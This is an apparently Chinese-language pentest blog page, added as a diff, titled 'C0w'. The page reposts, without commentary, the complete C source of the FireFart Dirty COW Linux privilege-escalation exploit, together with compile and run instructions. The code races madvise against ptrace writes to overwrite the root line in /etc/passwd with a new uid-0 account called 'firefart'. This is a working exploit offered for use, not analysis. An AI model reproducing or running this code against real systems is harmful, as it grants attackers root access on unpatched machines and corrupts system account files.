@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>C0w</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/c0w.html" rel="bookmark"
+           title="Permalink to C0w">C0w</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-09-12T00:00:00+02:00">
+                <a href='#'>09/12/2017 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p><a href="https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c">https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c</a></p>
+<div class="highlight"><pre><span></span><span class="nv">Compile</span> <span class="nv">with</span>:
+<span class="o">//</span>   <span class="nv">gcc</span> <span class="o">-</span><span class="nv">pthread</span> <span class="nv">dirty</span>.<span class="nv">c</span> <span class="o">-</span><span class="nv">o</span> <span class="nv">dirty</span> <span class="o">-</span><span class="nv">lcrypt</span>
+<span class="o">//</span>
+<span class="o">//</span> <span class="k">Then</span> <span class="nv">run</span> <span class="nv">the</span> <span class="nv">newly</span> <span class="nv">create</span> <span class="nv">binary</span> <span class="nv">by</span> <span class="nv">either</span> <span class="nv">doing</span>:
+<span class="o">//</span>   <span class="s2">&quot;</span><span class="s">./dirty</span><span class="s2">&quot;</span> <span class="nv">or</span> <span class="s2">&quot;</span><span class="s">./dirty my-new-password</span><span class="s2">&quot;</span>
+<span class="o">//</span>
+<span class="o">//</span> <span class="nv">Afterwards</span>, <span class="nv">you</span> <span class="nv">can</span> <span class="nv">either</span> <span class="s2">&quot;</span><span class="s">su firefart</span><span class="s2">&quot;</span> <span class="nv">or</span> <span class="s2">&quot;</span><span class="s">ssh firefart@...</span><span class="s2">&quot;</span>
+<span class="o">//</span>
+<span class="o">//</span> <span class="nv">DON</span><span class="s1">&#39;</span><span class="s">T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span>
+<span class="o">//</span>   <span class="nv">mv</span> <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">passwd</span>.<span class="nv">bak</span> <span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">passwd</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="o">//</span>
+<span class="o">//</span> <span class="nv">This</span> <span class="nv">exploit</span> <span class="nv">uses</span> <span class="nv">the</span> <span class="nv">pokemon</span> <span class="nv">exploit</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">dirtycow</span> <span class="nv">vulnerability</span>
+<span class="o">//</span> <span class="nv">as</span> <span class="nv">a</span> <span class="nv">base</span> <span class="nv">and</span> <span class="nv">automatically</span> <span class="nv">generates</span> <span class="nv">a</span> <span class="nv">new</span> <span class="nv">passwd</span> <span class="nv">line</span>.
+<span class="o">//</span> <span class="nv">The</span> <span class="nv">user</span> <span class="nv">will</span> <span class="nv">be</span> <span class="nv">prompted</span> <span class="k">for</span> <span class="nv">the</span> <span class="nv">new</span> <span class="nv">password</span> <span class="nv">when</span> <span class="nv">the</span> <span class="nv">binary</span> <span class="nv">is</span> <span class="nv">run</span>.
+<span class="o">//</span> <span class="nv">The</span> <span class="nv">original</span> <span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">passwd</span> <span class="nv">file</span> <span class="nv">is</span> <span class="k">then</span> <span class="nv">backed</span> <span class="nv">up</span> <span class="nv">to</span> <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">passwd</span>.<span class="nv">bak</span>
+<span class="o">//</span> <span class="nv">and</span> <span class="nv">overwrites</span> <span class="nv">the</span> <span class="nv">root</span> <span class="nv">account</span> <span class="nv">with</span> <span class="nv">the</span> <span class="nv">generated</span> <span class="nv">line</span>.
+<span class="o">//</span> <span class="nv">After</span> <span class="nv">running</span> <span class="nv">the</span> <span class="nv">exploit</span> <span class="nv">you</span> <span class="nv">should</span> <span class="nv">be</span> <span class="nv">able</span> <span class="nv">to</span> <span class="nv">login</span> <span class="nv">with</span> <span class="nv">the</span> <span class="nv">newly</span>
+<span class="o">//</span> <span class="nv">created</span> <span class="nv">user</span>.
+<span class="o">//</span>
+<span class="o">//</span> <span class="nv">To</span> <span class="nv">use</span> <span class="nv">this</span> <span class="nv">exploit</span> <span class="nv">modify</span> <span class="nv">the</span> <span class="nv">user</span> <span class="nv">values</span> <span class="nv">according</span> <span class="nv">to</span> <span class="nv">your</span> <span class="nv">needs</span>.
+<span class="o">//</span>   <span class="nv">The</span> <span class="nv">default</span> <span class="nv">is</span> <span class="s2">&quot;</span><span class="s">firefart</span><span class="s2">&quot;</span>.
+<span class="o">//</span>
+<span class="o">//</span> <span class="nv">Original</span> <span class="nv">exploit</span> <span class="ss">(</span><span class="nv">dirtycow</span><span class="s1">&#39;</span><span class="s">s ptrace_pokedata &quot;pokemon&quot; method):</span>
+<span class="o">//</span>   <span class="nv">https</span>:<span class="o">//</span><span class="nv">github</span>.<span class="nv">com</span><span class="o">/</span><span class="nv">dirtycow</span><span class="o">/</span><span class="nv">dirtycow</span>.<span class="nv">github</span>.<span class="nv">io</span><span class="o">/</span><span class="nv">blob</span><span class="o">/</span><span class="nv">master</span><span class="o">/</span><span class="nv">pokemon</span>.<span class="nv">c</span>
+<span class="o">//</span>
+<span class="o">//</span> <span class="nv">Compile</span> <span class="nv">with</span>:
+<span class="o">//</span>   <span class="nv">gcc</span> <span class="o">-</span><span class="nv">pthread</span> <span class="nv">dirty</span>.<span class="nv">c</span> <span class="o">-</span><span class="nv">o</span> <span class="nv">dirty</span> <span class="o">-</span><span class="nv">lcrypt</span>
+<span class="o">//</span>
+<span class="o">//</span> <span class="k">Then</span> <span class="nv">run</span> <span class="nv">the</span> <span class="nv">newly</span> <span class="nv">create</span> <span class="nv">binary</span> <span class="nv">by</span> <span class="nv">either</span> <span class="nv">doing</span>:
+<span class="o">//</span>   <span class="s2">&quot;</span><span class="s">./dirty</span><span class="s2">&quot;</span> <span class="nv">or</span> <span class="s2">&quot;</span><span class="s">./dirty my-new-password</span><span class="s2">&quot;</span>
+<span class="o">//</span>
+<span class="o">//</span> <span class="nv">Afterwards</span>, <span class="nv">you</span> <span class="nv">can</span> <span class="nv">either</span> <span class="s2">&quot;</span><span class="s">su firefart</span><span class="s2">&quot;</span> <span class="nv">or</span> <span class="s2">&quot;</span><span class="s">ssh firefart@...</span><span class="s2">&quot;</span>
+<span class="o">//</span>
+<span class="o">//</span> <span class="nv">DON</span><span class="s1">&#39;</span><span class="s">T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span>
+<span class="o">//</span>   <span class="nv">mv</span> <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">passwd</span>.<span class="nv">bak</span> <span class="o">/</span><span class="nv">etc</span><span class="o">/</span><span class="nv">passwd</span>
+<span class="o">//</span>
+<span class="o">//</span> <span class="nv">Exploit</span> <span class="nv">adopted</span> <span class="nv">by</span> <span class="nv">Christian</span> <span class="s2">&quot;</span><span class="s">FireFart</span><span class="s2">&quot;</span> <span class="nv">Mehlmauer</span>
+<span class="o">//</span> <span class="nv">https</span>:<span class="o">//</span><span class="nv">firefart</span>.<span class="nv">at</span>
+<span class="o">//</span>
+
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">fcntl</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">pthread</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">string</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">stdio</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">stdint</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">sys</span><span class="o">/</span><span class="nv">mman</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">sys</span><span class="o">/</span><span class="nv">types</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">sys</span><span class="o">/</span><span class="nv">stat</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">sys</span><span class="o">/</span><span class="k">wait</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">sys</span><span class="o">/</span><span class="nv">ptrace</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">stdlib</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">unistd</span>.<span class="nv">h</span><span class="o">&gt;</span>
+#<span class="k">include</span> <span class="o">&lt;</span><span class="nv">crypt</span>.<span class="nv">h</span><span class="o">&gt;</span>
+
+<span class="nv">const</span> <span class="nv">char</span> <span class="o">*</span><span class="nv">filename</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">/etc/passwd</span><span class="s2">&quot;</span><span class="c1">;</span>
+<span class="nv">const</span> <span class="nv">char</span> <span class="o">*</span><span class="nv">backup_filename</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">/tmp/passwd.bak</span><span class="s2">&quot;</span><span class="c1">;</span>
+<span class="nv">const</span> <span class="nv">char</span> <span class="o">*</span><span class="nv">salt</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">firefart</span><span class="s2">&quot;</span><span class="c1">;</span>
+
+<span class="nv">int</span> <span class="nv">f</span><span class="c1">;</span>
+<span class="nv">void</span> <span class="o">*</span><span class="nv">map</span><span class="c1">;</span>
+<span class="nv">pid_t</span> <span class="nv">pid</span><span class="c1">;</span>
+<span class="nv">pthread_t</span> <span class="nv">pth</span><span class="c1">;</span>
+<span class="nv">struct</span> <span class="nv">stat</span> <span class="nv">st</span><span class="c1">;</span>
+
+<span class="nv">struct</span> <span class="nv">Userinfo</span> {
+   <span class="nv">char</span> <span class="o">*</span><span class="nv">username</span><span class="c1">;</span>
+   <span class="nv">char</span> <span class="o">*</span><span class="nv">hash</span><span class="c1">;</span>
+   <span class="nv">int</span> <span class="nv">user_id</span><span class="c1">;</span>
+   <span class="nv">int</span> <span class="nv">group_id</span><span class="c1">;</span>
+   <span class="nv">char</span> <span class="o">*</span><span class="nv">info</span><span class="c1">;</span>
+   <span class="nv">char</span> <span class="o">*</span><span class="nv">home_dir</span><span class="c1">;</span>
+   <span class="nv">char</span> <span class="o">*</span><span class="nv">shell</span><span class="c1">;</span>
+}<span class="c1">;</span>
+
+<span class="nv">char</span> <span class="o">*</span><span class="nv">generate_password_hash</span><span class="ss">(</span><span class="nv">char</span> <span class="o">*</span><span class="nv">plaintext_pw</span><span class="ss">)</span> {
+  <span class="k">return</span> <span class="nv">crypt</span><span class="ss">(</span><span class="nv">plaintext_pw</span>, <span class="nv">salt</span><span class="ss">)</span><span class="c1">;</span>
+}
+
+<span class="nv">char</span> <span class="o">*</span><span class="nv">generate_passwd_line</span><span class="ss">(</span><span class="nv">struct</span> <span class="nv">Userinfo</span> <span class="nv">u</span><span class="ss">)</span> {
+  <span class="nv">const</span> <span class="nv">char</span> <span class="o">*</span><span class="nv">format</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">%s:%s:%d:%d:%s:%s:%s</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+  <span class="nv">int</span> <span class="nv">size</span> <span class="o">=</span> <span class="nv">snprintf</span><span class="ss">(</span><span class="nv">NULL</span>, <span class="mi">0</span>, <span class="nv">format</span>, <span class="nv">u</span>.<span class="nv">username</span>, <span class="nv">u</span>.<span class="nv">hash</span>,
+    <span class="nv">u</span>.<span class="nv">user_id</span>, <span class="nv">u</span>.<span class="nv">group_id</span>, <span class="nv">u</span>.<span class="nv">info</span>, <span class="nv">u</span>.<span class="nv">home_dir</span>, <span class="nv">u</span>.<span class="nv">shell</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="nv">char</span> <span class="o">*</span><span class="nv">ret</span> <span class="o">=</span> <span class="nv">malloc</span><span class="ss">(</span><span class="nv">size</span> <span class="o">+</span> <span class="mi">1</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="k">sprintf</span><span class="ss">(</span><span class="nv">ret</span>, <span class="nv">format</span>, <span class="nv">u</span>.<span class="nv">username</span>, <span class="nv">u</span>.<span class="nv">hash</span>, <span class="nv">u</span>.<span class="nv">user_id</span>,
+    <span class="nv">u</span>.<span class="nv">group_id</span>, <span class="nv">u</span>.<span class="nv">info</span>, <span class="nv">u</span>.<span class="nv">home_dir</span>, <span class="nv">u</span>.<span class="nv">shell</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="k">return</span> <span class="nv">ret</span><span class="c1">;</span>
+}
+
+<span class="nv">void</span> <span class="o">*</span><span class="nv">madviseThread</span><span class="ss">(</span><span class="nv">void</span> <span class="o">*</span><span class="nv">arg</span><span class="ss">)</span> {
+  <span class="nv">int</span> <span class="nv">i</span>, <span class="nv">c</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">;</span>
+  <span class="k">for</span><span class="ss">(</span><span class="nv">i</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">; i &lt; 200000000; i++) {</span>
+    <span class="nv">c</span> <span class="o">+=</span> <span class="nv">madvise</span><span class="ss">(</span><span class="nv">map</span>, <span class="mi">100</span>, <span class="nv">MADV_DONTNEED</span><span class="ss">)</span><span class="c1">;</span>
+  }
+  <span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">madvise %d</span><span class="se">\n\n</span><span class="s2">&quot;</span>, <span class="nv">c</span><span class="ss">)</span><span class="c1">;</span>
+}
+
+<span class="nv">int</span> <span class="nv">copy_file</span><span class="ss">(</span><span class="nv">const</span> <span class="nv">char</span> <span class="o">*</span><span class="nv">from</span>, <span class="nv">const</span> <span class="nv">char</span> <span class="o">*</span><span class="nv">to</span><span class="ss">)</span> {
+  <span class="o">//</span> <span class="nv">check</span> <span class="k">if</span> <span class="nv">target</span> <span class="nv">file</span> <span class="nv">already</span> <span class="nv">exists</span>
+  <span class="k">if</span><span class="ss">(</span><span class="nv">access</span><span class="ss">(</span><span class="nv">to</span>, <span class="nv">F_OK</span><span class="ss">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="ss">)</span> {
+    <span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">File %s already exists! Please delete it and run again</span><span class="se">\n</span><span class="s2">&quot;</span>,
+      <span class="nv">to</span><span class="ss">)</span><span class="c1">;</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="c1">;</span>
+  }
+
+  <span class="nv">char</span> <span class="nv">ch</span><span class="c1">;</span>
+  <span class="nv">FILE</span> <span class="o">*</span><span class="nv">source</span>, <span class="o">*</span><span class="nv">target</span><span class="c1">;</span>
+
+  <span class="nv">source</span> <span class="o">=</span> <span class="nv">fopen</span><span class="ss">(</span><span class="nv">from</span>, <span class="s2">&quot;</span><span class="s">r</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="k">if</span><span class="ss">(</span><span class="nv">source</span> <span class="o">==</span> <span class="nv">NULL</span><span class="ss">)</span> {
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="c1">;</span>
+  }
+  <span class="nv">target</span> <span class="o">=</span> <span class="nv">fopen</span><span class="ss">(</span><span class="nv">to</span>, <span class="s2">&quot;</span><span class="s">w</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="k">if</span><span class="ss">(</span><span class="nv">target</span> <span class="o">==</span> <span class="nv">NULL</span><span class="ss">)</span> {
+     <span class="nv">fclose</span><span class="ss">(</span><span class="nv">source</span><span class="ss">)</span><span class="c1">;</span>
+     <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="c1">;</span>
+  }
+
+  <span class="k">while</span><span class="ss">((</span><span class="nv">ch</span> <span class="o">=</span> <span class="nv">fgetc</span><span class="ss">(</span><span class="nv">source</span><span class="ss">))</span> <span class="o">!=</span> <span class="nv">EOF</span><span class="ss">)</span> {
+     <span class="nv">fputc</span><span class="ss">(</span><span class="nv">ch</span>, <span class="nv">target</span><span class="ss">)</span><span class="c1">;</span>
+   }
+
+  <span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">%s successfully backed up to %s</span><span class="se">\n</span><span class="s2">&quot;</span>,
+    <span class="nv">from</span>, <span class="nv">to</span><span class="ss">)</span><span class="c1">;</span>
+
+  <span class="nv">fclose</span><span class="ss">(</span><span class="nv">source</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="nv">fclose</span><span class="ss">(</span><span class="nv">target</span><span class="ss">)</span><span class="c1">;</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="c1">;</span>
+}
+
+<span class="nv">int</span> <span class="nv">main</span><span class="ss">(</span><span class="nv">int</span> <span class="nv">argc</span>, <span class="nv">char</span> <span class="o">*</span><span class="nv">argv</span>[]<span class="ss">)</span>
+{
+  <span class="o">//</span> <span class="nv">backup</span> <span class="nv">file</span>
+  <span class="nv">int</span> <span class="nv">ret</span> <span class="o">=</span> <span class="nv">copy_file</span><span class="ss">(</span><span class="nv">filename</span>, <span class="nv">backup_filename</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="k">if</span> <span class="ss">(</span><span class="nv">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="ss">)</span> {
+    <span class="k">exit</span><span class="ss">(</span><span class="nv">ret</span><span class="ss">)</span><span class="c1">;</span>
+  }
+
+  <span class="nv">struct</span> <span class="nv">Userinfo</span> <span class="nv">user</span><span class="c1">;</span>
+  <span class="o">//</span> <span class="nv">set</span> <span class="nv">values</span>, <span class="nv">change</span> <span class="nv">as</span> <span class="nv">needed</span>
+  <span class="nv">user</span>.<span class="nv">username</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">firefart</span><span class="s2">&quot;</span><span class="c1">;</span>
+  <span class="nv">user</span>.<span class="nv">user_id</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">;</span>
+  <span class="nv">user</span>.<span class="nv">group_id</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">;</span>
+  <span class="nv">user</span>.<span class="nv">info</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">pwned</span><span class="s2">&quot;</span><span class="c1">;</span>
+  <span class="nv">user</span>.<span class="nv">home_dir</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">/root</span><span class="s2">&quot;</span><span class="c1">;</span>
+  <span class="nv">user</span>.<span class="nv">shell</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">/bin/bash</span><span class="s2">&quot;</span><span class="c1">;</span>
+
+  <span class="nv">char</span> <span class="o">*</span><span class="nv">plaintext_pw</span><span class="c1">;</span>
+
+  <span class="k">if</span> <span class="ss">(</span><span class="nv">argc</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="ss">)</span> {
+    <span class="nv">plaintext_pw</span> <span class="o">=</span> <span class="nv">argv</span>[<span class="mi">1</span>]<span class="c1">;</span>
+    <span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">Please enter the new password: %s</span><span class="se">\n</span><span class="s2">&quot;</span>, <span class="nv">plaintext_pw</span><span class="ss">)</span><span class="c1">;</span>
+  } <span class="k">else</span> {
+    <span class="nv">plaintext_pw</span> <span class="o">=</span> <span class="nv">getpass</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">Please enter the new password: </span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+  }
+
+  <span class="nv">user</span>.<span class="nv">hash</span> <span class="o">=</span> <span class="nv">generate_password_hash</span><span class="ss">(</span><span class="nv">plaintext_pw</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="nv">char</span> <span class="o">*</span><span class="nv">complete_passwd_line</span> <span class="o">=</span> <span class="nv">generate_passwd_line</span><span class="ss">(</span><span class="nv">user</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">Complete line:</span><span class="se">\n</span><span class="s">%s</span><span class="se">\n</span><span class="s2">&quot;</span>, <span class="nv">complete_passwd_line</span><span class="ss">)</span><span class="c1">;</span>
+
+  <span class="nv">f</span> <span class="o">=</span> <span class="nv">open</span><span class="ss">(</span><span class="nv">filename</span>, <span class="nv">O_RDONLY</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="nv">fstat</span><span class="ss">(</span><span class="nv">f</span>, <span class="o">&amp;</span><span class="nv">st</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="nv">map</span> <span class="o">=</span> <span class="nv">mmap</span><span class="ss">(</span><span class="nv">NULL</span>,
+             <span class="nv">st</span>.<span class="nv">st_size</span> <span class="o">+</span> <span class="nv">sizeof</span><span class="ss">(</span><span class="nv">long</span><span class="ss">)</span>,
+             <span class="nv">PROT_READ</span>,
+             <span class="nv">MAP_PRIVATE</span>,
+             <span class="nv">f</span>,
+             <span class="mi">0</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">mmap: %lx</span><span class="se">\n</span><span class="s2">&quot;</span>,<span class="ss">(</span><span class="nv">unsigned</span> <span class="nv">long</span><span class="ss">)</span><span class="nv">map</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="nv">pid</span> <span class="o">=</span> <span class="nv">fork</span><span class="ss">()</span><span class="c1">;</span>
+  <span class="k">if</span><span class="ss">(</span><span class="nv">pid</span><span class="ss">)</span> {
+    <span class="nv">waitpid</span><span class="ss">(</span><span class="nv">pid</span>, <span class="nv">NULL</span>, <span class="mi">0</span><span class="ss">)</span><span class="c1">;</span>
+    <span class="nv">int</span> <span class="nv">u</span>, <span class="nv">i</span>, <span class="nv">o</span>, <span class="nv">c</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">;</span>
+    <span class="nv">int</span> <span class="nv">l</span><span class="o">=</span><span class="k">strlen</span><span class="ss">(</span><span class="nv">complete_passwd_line</span><span class="ss">)</span><span class="c1">;</span>
+    <span class="k">for</span><span class="ss">(</span><span class="nv">i</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">; i &lt; 10000/l; i++) {</span>
+      <span class="k">for</span><span class="ss">(</span><span class="nv">o</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">; o &lt; l; o++) {</span>
+        <span class="k">for</span><span class="ss">(</span><span class="nv">u</span> <span class="o">=</span> <span class="mi">0</span><span class="c1">; u &lt; 10000; u++) {</span>
+          <span class="nv">c</span> <span class="o">+=</span> <span class="nv">ptrace</span><span class="ss">(</span><span class="nv">PTRACE_POKETEXT</span>,
+                      <span class="nv">pid</span>,
+                      <span class="nv">map</span> <span class="o">+</span> <span class="nv">o</span>,
+                      <span class="o">*</span><span class="ss">((</span><span class="nv">long</span><span class="o">*</span><span class="ss">)(</span><span class="nv">complete_passwd_line</span> <span class="o">+</span> <span class="nv">o</span><span class="ss">)))</span><span class="c1">;</span>
+        }
+      }
+    }
+    <span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">ptrace %d</span><span class="se">\n</span><span class="s2">&quot;</span>,<span class="nv">c</span><span class="ss">)</span><span class="c1">;</span>
+  }
+  <span class="k">else</span> {
+    <span class="nv">pthread_create</span><span class="ss">(</span><span class="o">&amp;</span><span class="nv">pth</span>,
+                   <span class="nv">NULL</span>,
+                   <span class="nv">madviseThread</span>,
+                   <span class="nv">NULL</span><span class="ss">)</span><span class="c1">;</span>
+    <span class="nv">ptrace</span><span class="ss">(</span><span class="nv">PTRACE_TRACEME</span><span class="ss">)</span><span class="c1">;</span>
+    <span class="nv">kill</span><span class="ss">(</span><span class="nv">getpid</span><span class="ss">()</span>, <span class="nv">SIGSTOP</span><span class="ss">)</span><span class="c1">;</span>
+    <span class="nv">pthread_join</span><span class="ss">(</span><span class="nv">pth</span>,<span class="nv">NULL</span><span class="ss">)</span><span class="c1">;</span>
+  }
+
+  <span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">Done! Check %s to see if the new user was created.</span><span class="se">\n</span><span class="s2">&quot;</span>, <span class="nv">filename</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">You can log in with the username &#39;%s&#39; and the password &#39;%s&#39;.</span><span class="se">\n\n</span><span class="s2">&quot;</span>,
+    <span class="nv">user</span>.<span class="nv">username</span>, <span class="nv">plaintext_pw</span><span class="ss">)</span><span class="c1">;</span>
+    <span class="nv">printf</span><span class="ss">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s">DON&#39;T FORGET TO RESTORE! $ mv %s %s</span><span class="se">\n</span><span class="s2">&quot;</span>,
+    <span class="nv">backup_filename</span>, <span class="nv">filename</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="c1">;</span>
+}
+</pre></div>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
